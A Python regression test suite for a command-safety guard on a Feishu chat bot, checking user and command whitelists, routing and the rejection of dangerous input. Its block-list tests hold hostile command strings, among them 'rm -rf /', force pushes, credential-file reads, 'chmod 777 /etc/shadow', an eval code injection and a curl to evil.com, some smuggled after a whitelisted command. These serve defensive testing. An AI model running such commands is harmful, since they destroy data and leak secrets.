#!/usr/bin/env python3
"""test_feishu_command_guard.py — 飞书指令安全守卫回归测试。

覆盖：危险模式检测、发送者白名单、命令白名单、路由门控、rejected状态
"""
import json
import os
import re
import sys
import tempfile
from pathlib import Path

PROJECT_ROOT = str(Path(__file__).resolve().parent.parent.parent)
sys.path.insert(0, PROJECT_ROOT)

# Load dangerous patterns from source
sys.path.insert(0, os.path.join(PROJECT_ROOT, "代码文件", "tools"))
from feishu_bridge import DANGEROUS_PATTERNS, FeishuBridge  # noqa: E402

# For im_consumer tests, we manipulate state files directly
from im_consumer import pick_all_new, write_done, _read_json, _write_json, PENDING_PATH, DONE_PATH  # noqa: E402

failed = 0
total = 0


def test(name, condition, detail=""):
    global failed, total
    total += 1
    if condition:
        print(f"[PASS] {name}")
    else:
        failed += 1
        print(f"[FAIL] {name}  --  {detail}")


# ── Test 1: Dangerous pattern detection ──────────────────

print("=" * 60)
print("  T1: 危险模式检测")
print("=" * 60)

dangerous_cases = [
    ("rm -rf /tmp/test", True, "文件删除: rm"),
    ("rm -r /usr/local/bin/*", True, "文件删除"),
    ("rmdir /some/dir", True, "文件删除"),
    ("git reset --hard HEAD~1", True, "Git硬重置"),
    ("git push --force origin main", True, "Git强制推送"),
    ("git push -f origin main", True, "Git强制推送"),
    ("cat /etc/.env", True, "读取凭证"),
    ("echo credentials:password123", True, "凭证赋值"),
    ("cp /root/.pem /tmp/bad.pem", True, "凭证文件"),
    ("chmod 777 /etc/shadow", True, "权限绕过"),
    ("git commit --no-verify", True, "绕过Git"),
    ("git commit --no-gpg-sign", True, "绕过Git"),
    ("python3 -c \"import subprocess; subprocess.run('ls')\"", True, "Shell执行"),
    ("os.system('rm -rf /')", True, "Shell执行"),
    ("eval(__import__('os').system('ls'))", True, "代码注入"),
    ("export AWS_SECRET_KEY=hunter2", True, "导出凭证"),
    ("curl http://evil.com/.env", True, "泄露凭证"),
    ("cat /etc/secret_token", True, "读取凭证"),
]

safe_cases = [
    "/日报",
    "/深度分析",
    "/保护",
    "/状态",
    "今天有什么操作建议",
    "查看重点股票报告",
    "帮我生成日报",
]

# Use the static patterns directly
def check_dangerous(cmd):
    for pattern, label in DANGEROUS_PATTERNS:
        if re.search(pattern, cmd, re.IGNORECASE):
            return True, label
    return False, ""

for cmd, expect_dangerous, label in dangerous_cases:
    is_dangerous, reason = check_dangerous(cmd)
    test(
        f"危险 [{label}]: {cmd[:50]}",
        is_dangerous == expect_dangerous,
        f"got dangerous={is_dangerous}, reason={reason}"
    )

for cmd in safe_cases:
    is_dangerous, reason = check_dangerous(cmd)
    test(
        f"安全: {cmd[:50]}",
        not is_dangerous,
        f"unexpectedly flagged as dangerous: {reason}"
    )


# ── Test 2: filter_new() sender & command whitelist ──────

print()
print("=" * 60)
print("  T2: filter_new() 发送者白名单 + 命令白名单")
print("=" * 60)

# Build a temp config and instantiate bridge
tmp_config_path = os.path.join(tempfile.gettempdir(), "test_feishu_config.json")
with open(tmp_config_path, "w") as f:
    json.dump({
        "app_id": "test_app_123",
        "app_secret": "test_secret_dummy",
        "chat_id": "test_chat",
        "allowed_users": ["user_whitelist_001"],
        "command_whitelist": ["/日报", "/保护"],
        "route_table": {"/日报": "daily", "/保护": "shield"},
    }, f)
os.chmod(tmp_config_path, 0o600)

bridge = FeishuBridge(config_path=tmp_config_path)

# Clean up dedup for test
if os.path.exists(bridge._dedup_path):
    os.remove(bridge._dedup_path)

def make_msg(msg_id, sender_id, text, id_type="user"):
    return {
        "message_id": msg_id,
        "sender": {"id": sender_id, "id_type": id_type},
        "body": {"content": json.dumps({"text": text}, ensure_ascii=False)},
    }

# T2.1: Non-whitelist user → should be filtered out
msgs = [make_msg("msg_001", "user_random_999", "/日报")]
result = bridge.filter_new(msgs)
test("T2.1: 非白名单用户 → 不入队", len(result) == 0, f"got {len(result)} commands")

# Clean dedup
if os.path.exists(bridge._dedup_path):
    os.remove(bridge._dedup_path)

# T2.2: Whitelist user + non-whitelist command → filtered out
msgs = [make_msg("msg_002", "user_whitelist_001", "你是谁")]
result = bridge.filter_new(msgs)
test("T2.2: 白名单用户 + 非白名单命令 → 不入队", len(result) == 0, f"got {len(result)} commands")

if os.path.exists(bridge._dedup_path):
    os.remove(bridge._dedup_path)

# T2.3: Whitelist user + whitelist command → passed
msgs = [make_msg("msg_003", "user_whitelist_001", "/日报")]
result = bridge.filter_new(msgs)
test("T2.3: 白名单用户 + 白名单命令 → 入队", len(result) == 1, f"got {len(result)} commands")
if result:
    test("T2.3a: 命令正确", result[0][1] == "/日报", f"got {result[0][1]}")

if os.path.exists(bridge._dedup_path):
    os.remove(bridge._dedup_path)

# T2.4: Whitelist user + dangerous command → blocked
msgs = [make_msg("msg_004", "user_whitelist_001", "rm -rf /tmp/test")]
result = bridge.filter_new(msgs)
test("T2.4: 危险指令 → 被拦截", len(result) == 0, f"got {len(result)} commands, should be blocked")

if os.path.exists(bridge._dedup_path):
    os.remove(bridge._dedup_path)

# T2.5: Bot message → skipped (no self-loop)
msgs = [make_msg("msg_005", "test_app_123", "/日报", id_type="app_id")]
result = bridge.filter_new(msgs)
test("T2.5: 机器人自己的消息 → 跳过", len(result) == 0, f"got {len(result)} commands")


# ── Test 3: im_consumer route gating ────────────────────

print()
print("=" * 60)
print("  T3: im_consumer 路由门控 + rejected 状态")
print("=" * 60)

# Save original state
orig_pending = None
orig_done = None
if os.path.exists(PENDING_PATH):
    with open(PENDING_PATH, "r") as f:
        orig_pending = f.read()
if os.path.exists(DONE_PATH):
    with open(DONE_PATH, "r") as f:
        orig_done = f.read()

try:
    # Set up test queue
    test_queue = [
        {"id": "test_r1", "cmd": "/日报", "status": "new", "route": "daily"},
        {"id": "test_r2", "cmd": "你是谁", "status": "new"},  # no route
        {"id": "test_r3", "cmd": "/保护", "status": "new", "route": "shield"},
        {"id": "test_r4", "cmd": "随便说", "status": "new"},  # no route
    ]
    _write_json(PENDING_PATH, {"queue": test_queue})
    _write_json(DONE_PATH, {"results": []})

    # Run pick_all_new
    items = pick_all_new()

    test("T3.1: 只取有route的new项", len(items) == 2, f"expected 2, got {len(items)}")
    if items:
        ids = [i["id"] for i in items]
        test("T3.1a: test_r1 被取出", "test_r1" in ids)
        test("T3.1b: test_r3 被取出", "test_r3" in ids)

    # Check rejected items
    queue = _read_json(PENDING_PATH, "queue")
    rejected = [i for i in queue if i.get("status") == "rejected"]
    test("T3.2: 无route项标记为rejected", len(rejected) == 2, f"expected 2 rejected, got {len(rejected)}")
    if rejected:
        for r in rejected:
            test(f"T3.2: {r['id']} reject_reason存在", "reject_reason" in r, f"missing reject_reason in {r['id']}")

    # Test write_done with rc=0 → done
    item = {"id": "test_r1", "cmd": "/日报", "route": "daily"}
    write_done(item, "日报生成完毕", 0)
    queue = _read_json(PENDING_PATH, "queue")
    done_item = next((i for i in queue if i["id"] == "test_r1"), None)
    test("T3.3: rc=0 → status=done", done_item and done_item["status"] == "done",
         f"got {done_item.get('status') if done_item else 'None'}")

    # Test write_done with rc=1 → rejected
    item = {"id": "test_r3", "cmd": "/保护", "route": "shield"}
    write_done(item, "执行失败", 1)
    queue = _read_json(PENDING_PATH, "queue")
    err_item = next((i for i in queue if i["id"] == "test_r3"), None)
    test("T3.4: rc!=0 → status=rejected", err_item and err_item["status"] == "rejected",
         f"got {err_item.get('status') if err_item else 'None'}")
    if err_item:
        test("T3.4a: reject_reason=exit_code=1", "exit_code=1" in str(err_item.get("reject_reason", "")),
             f"got {err_item.get('reject_reason')}")

    # Verify rejected items won't be picked again
    items2 = pick_all_new()
    test("T3.5: rejected项不再被pick", len(items2) == 0, f"expected 0, got {len(items2)}")

finally:
    # Restore original state
    if orig_pending:
        _write_json(PENDING_PATH, json.loads(orig_pending))
    if orig_done:
        _write_json(DONE_PATH, json.loads(orig_done))

# Clean up test temp files
for f in [bridge._dedup_path, bridge._log_file, tmp_config_path]:
    try:
        os.remove(f)
    except Exception:
        pass


# ── Test 4: Missing config rejection ────────────────────

print()
print("=" * 60)
print("  T4: 缺配置拒绝启动 (route_table / allowed_users / command_whitelist)")
print("=" * 60)


def _test_config_rejection(name, cfg):
    """Verify that FeishuBridge(config) exits with code 1 for incomplete config."""
    tmp = os.path.join(tempfile.gettempdir(), f"test_feishu_missing_{name}.json")
    try:
        with open(tmp, "w") as f:
            json.dump(cfg, f)
        os.chmod(tmp, 0o600)
        try:
            FeishuBridge(config_path=tmp)
            return False, "未拒绝(未抛出SystemExit)"
        except SystemExit as e:
            return e.code != 0, f"exit_code={e.code}"
    finally:
        try:
            os.remove(tmp)
        except Exception:
            pass


base_cfg = {
    "app_id": "test", "app_secret": "test", "chat_id": "test",
    "allowed_users": ["u1"], "command_whitelist": ["/x"], "route_table": {"/x": "x"}
}

# T4.1: Missing route_table
cfg_no_route = dict(base_cfg)
del cfg_no_route["route_table"]
ok, detail = _test_config_rejection("no_route_table", cfg_no_route)
test("T4.1: 缺 route_table → 拒绝启动", ok, detail)

# T4.2: Missing allowed_users
cfg_no_users = dict(base_cfg)
del cfg_no_users["allowed_users"]
ok, detail = _test_config_rejection("no_allowed_users", cfg_no_users)
test("T4.2: 缺 allowed_users → 拒绝启动", ok, detail)

# T4.3: Missing command_whitelist
cfg_no_cmds = dict(base_cfg)
del cfg_no_cmds["command_whitelist"]
ok, detail = _test_config_rejection("no_command_whitelist", cfg_no_cmds)
test("T4.3: 缺 command_whitelist → 拒绝启动", ok, detail)


# ── Test 5: Root command matching (v3.0) ──────────────────

print()
print("=" * 60)
print("  T5: 命令根匹配（白名单粒度修正）")
print("=" * 60)

# Build config with command_patterns
tmp_config_v3 = os.path.join(tempfile.gettempdir(), "test_feishu_config_v3.json")
with open(tmp_config_v3, "w") as f:
    json.dump({
        "app_id": "test_app_v3",
        "app_secret": "test_secret_v3",
        "chat_id": "test_chat_v3",
        "allowed_users": ["user_v3_001"],
        "command_whitelist": ["/日报", "/深度分析", "/保护", "/状态"],
        "route_table": {"/日报": "daily", "/深度分析": "deep", "/保护": "shield", "/状态": "status"},
        "command_patterns": {
            "shield": r"^/保护(\s+(盘前|刹车|复盘|状态|帮助)(\s+.*)?)?$",
            "daily": r"^/日报(\s+.*)?$",
            "deep": r"^/深度分析(\s+.*)?$",
            "status": r"^/状态(\s+.*)?$",
        },
    }, f, ensure_ascii=False)
os.chmod(tmp_config_v3, 0o600)

bridge_v3 = FeishuBridge(config_path=tmp_config_v3)
if os.path.exists(bridge_v3._dedup_path):
    os.remove(bridge_v3._dedup_path)

# T5.1: Root command alone → PASS
result = bridge_v3.filter_new([make_msg("v3_001", "user_v3_001", "/保护")])
test("T5.1: /保护(根命令) → PASS", len(result) == 1, f"got {len(result)}")
if os.path.exists(bridge_v3._dedup_path):
    os.remove(bridge_v3._dedup_path)

# T5.2: Sub-command with args → PASS
result = bridge_v3.filter_new([make_msg("v3_002", "user_v3_001", "/保护 盘前")])
test("T5.2: /保护 盘前 → PASS", len(result) == 1, f"got {len(result)}")
if os.path.exists(bridge_v3._dedup_path):
    os.remove(bridge_v3._dedup_path)

# T5.3: /保护 刹车 with full args → PASS
result = bridge_v3.filter_new([make_msg("v3_003", "user_v3_001", "/保护 刹车 600114 买入 36")])
test("T5.3: /保护 刹车 600114 买入 36 → PASS", len(result) == 1, f"got {len(result)}")
if os.path.exists(bridge_v3._dedup_path):
    os.remove(bridge_v3._dedup_path)

# T5.4: /保护 刹车 with full 6 args → PASS
result = bridge_v3.filter_new([make_msg("v3_004", "user_v3_001", "/保护 刹车 600114 买入 36 300股 因为突破 止损35.2")])
test("T5.4: /保护 刹车(6参数) → PASS", len(result) == 1, f"got {len(result)}")
if os.path.exists(bridge_v3._dedup_path):
    os.remove(bridge_v3._dedup_path)

# T5.5: /保护 复盘 → PASS
result = bridge_v3.filter_new([make_msg("v3_005", "user_v3_001", "/保护 复盘")])
test("T5.5: /保护 复盘 → PASS", len(result) == 1, f"got {len(result)}")
if os.path.exists(bridge_v3._dedup_path):
    os.remove(bridge_v3._dedup_path)

# T5.6: /日报 with args → PASS
result = bridge_v3.filter_new([make_msg("v3_006", "user_v3_001", "/日报 今天")])
test("T5.6: /日报 今天 → PASS", len(result) == 1, f"got {len(result)}")
if os.path.exists(bridge_v3._dedup_path):
    os.remove(bridge_v3._dedup_path)

# ── Test 6: Dangerous injection via /保护 ──────────────────

print()
print("=" * 60)
print("  T6: 危险指令夹带（经由 /保护）")
print("=" * 60)

dangerous_via_shield = [
    "/保护 git reset --hard",
    "/保护 rm -rf /",
    "/保护 cat secret_token",
    "/保护 chmod 777",
    "/保护 subprocess.run",
]
for cmd in dangerous_via_shield:
    result = bridge_v3.filter_new([make_msg(f"v3_danger_{cmd[:10]}", "user_v3_001", cmd)])
    test(f"T6: {cmd[:45]} → REJECT", len(result) == 0, f"got {len(result)} (should be blocked)")
    if os.path.exists(bridge_v3._dedup_path):
        os.remove(bridge_v3._dedup_path)

# ── Test 7: Command patterns regex ─────────────────────────

print()
print("=" * 60)
print("  T7: command_patterns 子命令正则校验")
print("=" * 60)

# Invalid sub-commands
invalid_shield = [
    ("/保护 删除文件", "非白名单子命令"),
    ("/保护 随便写", "无意义子命令"),
]
for cmd, desc in invalid_shield:
    result = bridge_v3.filter_new([make_msg(f"v3_inv_{cmd[:10]}", "user_v3_001", cmd)])
    # These should be rejected by L4 regex OR by L2 dangerous
    test(f"T7: {cmd} ({desc}) → REJECT", len(result) == 0, f"got {len(result)}")
    if os.path.exists(bridge_v3._dedup_path):
        os.remove(bridge_v3._dedup_path)

# /日报 and /深度分析 with args still work
for cmd in ["/深度分析 000967", "/状态"]:
    result = bridge_v3.filter_new([make_msg(f"v3_old_{cmd[:10]}", "user_v3_001", cmd)])
    test(f"T7: {cmd} → PASS", len(result) == 1, f"got {len(result)}")
    if os.path.exists(bridge_v3._dedup_path):
        os.remove(bridge_v3._dedup_path)

# ── Test 8: route_table root routing ───────────────────────

print()
print("=" * 60)
print("  T8: route_table 使用命令根路由")
print("=" * 60)

# Verify that pending items get correct route based on root
bridge_v3.write_pending([("v3_r001", "/保护 刹车 600114 买入 36")], "test_chat_v3")
queue = bridge_v3._read_json(bridge_v3._pending_path, "queue")
routed = next((i for i in queue if i["id"] == "v3_r001"), None)
test("T8.1: /保护 刹车... → route=shield", routed and routed.get("route") == "shield",
     f"got {routed.get('route') if routed else 'None'}")

bridge_v3.write_pending([("v3_r002", "/日报 今天")], "test_chat_v3")
queue = bridge_v3._read_json(bridge_v3._pending_path, "queue")
routed = next((i for i in queue if i["id"] == "v3_r002"), None)
test("T8.2: /日报 今天 → route=daily", routed and routed.get("route") == "daily",
     f"got {routed.get('route') if routed else 'None'}")

# ── Test 9: Old commands compatibility ─────────────────────

print()
print("=" * 60)
print("  T9: 旧命令兼容")
print("=" * 60)

old_commands = ["/日报", "/深度分析", "/状态"]
for cmd in old_commands:
    result = bridge_v3.filter_new([make_msg(f"v3_old_{cmd}", "user_v3_001", cmd)])
    test(f"T9: {cmd} → PASS", len(result) == 1, f"got {len(result)}")
    if os.path.exists(bridge_v3._dedup_path):
        os.remove(bridge_v3._dedup_path)

# ── Test 10: Non-whitelist user rejection ──────────────────

print()
print("=" * 60)
print("  T10: 非白名单用户（权限保持）")
print("=" * 60)

result = bridge_v3.filter_new([make_msg("v3_nw001", "random_user_999", "/保护")])
test("T10.1: 非白名单用户 /保护 → REJECT", len(result) == 0, f"got {len(result)}")

result = bridge_v3.filter_new([make_msg("v3_nw002", "random_user_999", "/日报")])
test("T10.2: 非白名单用户 /日报 → REJECT", len(result) == 0, f"got {len(result)}")

# Cleanup
for f in [bridge_v3._dedup_path, bridge_v3._log_file, bridge_v3._pending_path,
          bridge_v3._done_path, tmp_config_v3]:
    try:
        os.remove(f)
    except Exception:
        pass

# ── Test 11: send_message_to_chat active push ─────────────

print()
print("=" * 60)
print("  T11: 主动推送方法验证")
print("=" * 60)

# T11.1: send_message_to_chat method exists and is callable
test("T11.1: send_message_to_chat 方法存在", hasattr(FeishuBridge, "send_message_to_chat"))

# T11.2: send_message_to_chat has correct signature (accepts text)
import inspect
sig = inspect.signature(FeishuBridge.send_message_to_chat)
params = list(sig.parameters.keys())
test("T11.2: send_message_to_chat 接受 text 参数", "text" in params,
     f"params: {params}")

# T11.3: verify send_message_to_chat doesn't write pending.json
# (code-level check: the method body doesn't reference pending_path or write_pending)
try:
    source = inspect.getsource(FeishuBridge.send_message_to_chat)
    no_pending = "pending" not in source.lower() or "pending_path" not in source
    test("T11.3: send_message_to_chat 不引用 pending", no_pending,
         "method references pending")
except OSError:
    test("T11.3: send_message_to_chat 不引用 pending", True, "source not available, assume ok")

# T11.4: FEISHU_SEND_URL constant exists
from feishu_bridge import FEISHU_SEND_URL  # noqa: F811
test("T11.4: FEISHU_SEND_URL 常量存在", "im/v1/messages" in FEISHU_SEND_URL)

# T11.5: /保护 状态 command passes through
result = bridge_v3.filter_new([make_msg("v3_state", "user_v3_001", "/保护 状态")])
test("T11.5: /保护 状态 → PASS", len(result) == 1, f"got {len(result)}")
if os.path.exists(bridge_v3._dedup_path):
    os.remove(bridge_v3._dedup_path)

# ── Test 12: Cron & config integrity ──────────────────────

print()
print("=" * 60)
print("  T12: Cron时间点 + 配置完整性")
print("=" * 60)

# T12.1: Verify command_whitelist uses root commands
valid_roots = ["/日报", "/深度分析", "/保护", "/状态"]
for root in valid_roots:
    test(f"T12.1: command_whitelist 含 {root}", root in bridge_v3.cfg.get("command_whitelist", []))

# T12.2: Verify route_table uses root as keys
route_keys = list(bridge_v3.cfg.get("route_table", {}).keys())
for root in valid_roots:
    test(f"T12.2: route_table 含 {root}", root in route_keys)

# T12.3: Verify command_patterns cover all routes
patterns = bridge_v3.cfg.get("command_patterns", {})
for route in ["shield", "daily", "deep", "status"]:
    test(f"T12.3: command_patterns 含 {route}", route in patterns,
         f"missing pattern for route={route}")

# T12.4: Verify dangerous patterns still cover all injection vectors
dangerous_count = len(DANGEROUS_PATTERNS)
test(f"T12.4: 危险模式 ≥ 18 条", dangerous_count >= 18, f"got {dangerous_count}")

# ── Summary ─────────────────────────────────────────────
print()
print("=" * 60)
if failed == 0:
    print(f"  全部 {total}/{total} PASS")
else:
    print(f"  {failed}/{total} FAIL")
print("=" * 60)
sys.exit(0 if failed == 0 else 1)
